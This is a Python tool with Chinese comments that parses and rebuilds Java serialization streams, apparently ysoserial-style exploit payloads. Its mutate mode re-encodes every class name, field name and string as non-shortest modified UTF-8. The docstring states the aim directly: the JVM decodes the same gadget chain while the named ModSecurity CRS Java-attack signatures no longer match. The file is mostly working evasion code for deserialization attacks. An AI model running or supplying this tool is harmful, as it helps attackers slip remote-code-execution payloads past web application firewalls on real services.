# -*- coding: utf-8 -*-
"""Java 序列化流解析/重建/非最短 UTF-8 变异器。

按 Java Object Serialization Spec（grammar, §6.4）递归下降解析 ysoserial
风格的载荷流，支持三种模式：
  --check   解析后原样重建，要求与输入逐字节一致（结构模型自证）
  --mutate  对所有 UTF 字符串（类名/字段名/TC_STRING 内容）做 2 字节/字符的
            非最短 modified-UTF-8 重编码后重建。ObjectInputStream.readUTFBody
            不做最短形式校验，JVM 解出的字符串与原件完全相同（gadget 语义不变），
            而 WAF 的明文 ASCII 子串签名（CRS 944100/944120/944130/944250）全部失配。

用法：python utf8_mutate.py --check in.ser | --mutate in.ser out.ser
"""
import os
import sys

DEBUG = os.environ.get("DESER_DEBUG") == "1"

PRIM_SIZE = {"B": 1, "C": 2, "D": 8, "F": 4, "I": 4, "J": 8, "S": 2, "Z": 1}
PRIM_FIELD_TAGS = {"B": 0x42, "C": 0x43, "D": 0x44, "F": 0x46, "I": 0x49,
                   "J": 0x4A, "S": 0x53, "Z": 0x5A}


class CD:
    """一个 classdesc 的信息（含超类链）。"""
    def __init__(self, name, flags, fields, chain):
        self.name = name
        self.flags = flags
        self.fields = fields          # [(typecode, name, classname?)]
        self.chain = chain            # [(name, flags, fields), ...] 自身在前


class Parser:
    def __init__(self, data, mutate=False):
        self.d = data
        self.i = 0
        self.out = bytearray()
        self.mutate = mutate
        self.next_handle = 0x7E0000
        self.classdescs = {}          # handle -> CD

    # ---------- 基础 ----------
    def emit_read(self, n):
        self.out += self.d[self.i:self.i + n]
        self.i += n

    def u1(self):
        v = self.d[self.i]
        self.emit_read(1)
        return v

    def u4(self):
        v = int.from_bytes(self.d[self.i:self.i + 4], "big")
        self.emit_read(4)
        return v

    def raw(self, n):
        self.emit_read(n)

    def handle(self):
        h = self.next_handle
        self.next_handle += 1
        if DEBUG:
            sys.stderr.write("HANDLE %d @%d\n" % (h, self.i))
        return h

    def utf(self, wide=False):
        if wide:
            ln = self.u4()
        else:
            ln = (self.d[self.i] << 8) | self.d[self.i + 1]
            self.i += 2
        body = self.d[self.i:self.i + ln]
        self.i += len(body)
        newbody = expand(body) if self.mutate else body
        # UTF 前缀 = 字节数（writeUTF 语义），重编码后须按新字节数重写前缀
        if wide:
            self.out += len(newbody).to_bytes(4, "big")
        else:
            if len(newbody) > 0xFFFF:
                raise ValueError("expanded utf body too long for u2 prefix")
            self.out += len(newbody).to_bytes(2, "big")
        self.out += newbody
        return body.decode("utf-8", "replace")

    # ---------- content ----------
    def content(self, until_endblock=False):
        """读一个 content。返回 tag 名；遇 TC_ENDBLOCKDATA 返回 'end'。"""
        if self.i >= len(self.d):
            return "eof"
        tag = self.d[self.i]
        if tag == 0x78:
            self.u1()
            return "end"
        if tag == 0x77:  # TC_BLOCKDATA
            self.u1()
            ln = self.u1()
            self.raw(ln)
            return "block"
        if tag == 0x7A:  # TC_BLOCKDATALONG
            self.u1()
            self.raw(self.u4())
            return "block"
        if tag == 0x71:  # TC_REFERENCE
            self.u1()
            v = self.u4()
            if DEBUG:
                sys.stderr.write("REF %d @%d\n" % (v, self.i))
            return "ref"
        if tag == 0x70:  # TC_NULL
            self.u1()
            return "null"
        if tag == 0x79:  # TC_RESET
            self.u1()
            return "reset"
        if tag == 0x74:  # TC_STRING
            self.u1()
            self.handle()
            self.utf()
            return "string"
        if tag == 0x7C:  # TC_LONGSTRING
            self.u1()
            self.handle()
            self.utf(wide=True)
            return "string"
        if tag == 0x72:
            self.new_classdesc()
            return "classdesc"
        if tag == 0x7D:
            self.new_proxyclassdesc()
            return "proxydesc"
        if tag == 0x75:
            self.new_array()
            return "array"
        if tag == 0x76:
            self.new_class()
            return "class"
        if tag == 0x7E:
            self.new_enum()
            return "enum"
        if tag == 0x73:
            self.new_object()
            return "object"
        if tag == 0x7B:  # TC_EXCEPTION
            raise ValueError("TC_EXCEPTION 不支持")
        raise ValueError("unknown tag %02x @%d" % (tag, self.i))

    def contents_until_end(self):
        while True:
            r = self.content()
            if r == "end":
                return
            if r == "eof":
                raise ValueError("注解区意外到达流尾 @%d（结构模型错位）" % self.i)

    # ---------- 结构 ----------
    def new_classdesc(self):
        self.u1()
        h = self.handle()
        name = self.utf()              # ysoserial 类名均为 ASCII：字符数==字节数
        self.raw(8)                    # serialVersionUID
        flags = self.u1()
        nf = (self.d[self.i] << 8) | self.d[self.i + 1]
        self.emit_read(2)
        fields = []
        for _ in range(nf):
            tc = chr(self.u1())
            self.utf()                 # 字段名
            if tc in ("L", "["):
                nxt = self.d[self.i]
                if nxt == 0x74:
                    self.u1()
                    self.handle()
                    self.utf()
                elif nxt == 0x71:
                    self.u1()
                    self.u4()
                elif nxt == 0x76:
                    self.new_class()
                elif nxt == 0x70:
                    self.u1()
                else:
                    raise ValueError("className1 tag %02x @%d" % (nxt, self.i))
            fields.append(tc)
        self.contents_until_end()      # classAnnotation
        # superClassDesc
        nxt = self.d[self.i]
        chain = [(name, flags, fields)]
        super_cd = None
        if nxt == 0x72:
            super_cd = self.new_classdesc()
        elif nxt == 0x7D:
            self.new_proxyclassdesc()
        elif nxt == 0x70:
            self.u1()
        elif nxt == 0x71:
            self.u1()
            h_ref = self.u4()
            super_cd = self.classdescs.get(h_ref)
        elif nxt == 0x76:
            self.new_class()
        else:
            raise ValueError("super tag %02x @%d" % (nxt, self.i))
        if super_cd is not None:
            chain = chain + super_cd.chain
        self.classdescs[h] = CD(name, flags, fields, chain)
        if DEBUG:
            sys.stderr.write("CD #%d %s flags=%x fields=%d @%d\n"
                             % (h - 0x7E0000, name, flags, len(fields), self.i))
        return self.classdescs[h]

    def new_proxyclassdesc(self):
        self.u1()
        self.handle()
        n = (self.d[self.i] << 8) | self.d[self.i + 1]
        self.emit_read(2)
        for _ in range(n):
            self.utf()
        self.contents_until_end()
        nxt = self.d[self.i]
        if nxt == 0x72:
            self.new_classdesc()
        elif nxt == 0x70:
            self.u1()
        elif nxt == 0x71:
            self.u1()
            self.u4()
        else:
            raise ValueError("proxy super tag %02x" % nxt)

    def classdesc_ref(self):
        """TC_OBJECT/TC_ARRAY/TC_CLASS/TC_ENUM 的 classDesc 位置。返回 CD 链。"""
        nxt = self.d[self.i]
        if nxt == 0x72:
            return self.new_classdesc().chain
        if nxt == 0x7D:
            self.new_proxyclassdesc()
            return []
        if nxt == 0x71:
            self.u1()
            h = self.u4()
            if h not in self.classdescs:
                raise KeyError("classdesc ref %d 未登记；已登记: %s" %
                               (h, sorted(self.classdescs)[-6:]))
            return self.classdescs[h].chain
        if nxt == 0x70:
            self.u1()
            return []
        raise ValueError("classDesc tag %02x @%d" % (nxt, self.i))

    def new_object(self):
        self.u1()
        chain = self.classdesc_ref()   # 规范：classDesc 在 newHandle 之前
        self.handle()
        if DEBUG:
            sys.stderr.write("OBJ %s @%d\n" % (chain[0][0] if chain else "?", self.i))
        for (name, flags, fields) in chain:
            if DEBUG:
                sys.stderr.write("  VALS %s fields=%d @%d\n" % (name, len(fields), self.i))
            for tc in fields:
                if tc in PRIM_SIZE:
                    self.raw(PRIM_SIZE[tc])
                else:
                    self.content()
            if flags & 0x01:           # SC_WRITE_METHOD -> objectAnnotation
                self.contents_until_end()
            if DEBUG:
                sys.stderr.write("  DONE %s @%d\n" % (name, self.i))

    def new_array(self):
        self.u1()
        chain = self.classdesc_ref()   # classDesc 先于 newHandle
        self.handle()
        name = chain[0][0] if chain else ""
        count = self.u4()
        if name.startswith("[") and len(name) > 1 and name[1] in PRIM_SIZE:
            self.raw(count * PRIM_SIZE[name[1]])
        else:
            for _ in range(count):
                self.content()

    def new_class(self):
        self.u1()
        self.classdesc_ref()           # classDesc 先于 newHandle
        self.handle()

    def new_enum(self):
        self.u1()
        self.classdesc_ref()           # classDesc 先于 newHandle
        self.handle()
        nxt = self.d[self.i]
        if nxt == 0x74:
            self.u1()
            self.handle()
            self.utf()
        elif nxt == 0x71:
            self.u1()
            self.u4()
        else:
            raise ValueError("enum name tag %02x" % nxt)


def expand(body):
    out = bytearray()
    i, n = 0, len(body)
    while i < n:
        b = body[i]
        if b < 0x80:
            out += bytes([0xC0 | (b >> 6), 0x80 | (b & 0x3F)])
            i += 1
        elif b >> 5 == 0b110:
            out += body[i:i + 2]
            i += 2
        elif b >> 4 == 0b1110:
            out += body[i:i + 3]
            i += 3
        else:
            raise ValueError("bad utf8 byte %02x" % b)
    return bytes(out)


def process(data, mutate):
    p = Parser(data, mutate=mutate)
    if data[:4] != b"\xac\xed\x00\x05":
        raise ValueError("not a java serialization stream (magic)")
    p.raw(4)
    while p.i < len(data):
        r = p.content()
        if r == "eof":
            break
    if p.i != len(data):
        raise ValueError("未消费到流尾: i=%d len=%d" % (p.i, len(data)))
    return bytes(p.out)


if __name__ == "__main__":
    mode, paths = sys.argv[1], sys.argv[2:]
    raw = open(paths[0], "rb").read()
    if mode == "--check":
        rebuilt = process(raw, mutate=False)
        if rebuilt == raw:
            print("[OK] round-trip 逐字节一致 (%d bytes)" % len(raw))
        else:
            for k in range(min(len(rebuilt), len(raw))):
                if rebuilt[k] != raw[k]:
                    print("[FAIL] 首个差异 @%d: %02x != %02x" % (k, raw[k], rebuilt[k]))
                    break
            print("[FAIL] 长度 %d vs %d" % (len(raw), len(rebuilt)))
            sys.exit(1)
    elif mode == "--mutate":
        out = process(raw, mutate=True)
        with open(paths[1], "wb") as f:
            f.write(out)
        print("[*] %s: %d -> %d bytes (utf8-nonshort mutated)" % (paths[1], len(raw), len(out)))
    else:
        raise SystemExit("用法: utf8_mutate.py --check in.ser | --mutate in.ser out.ser")
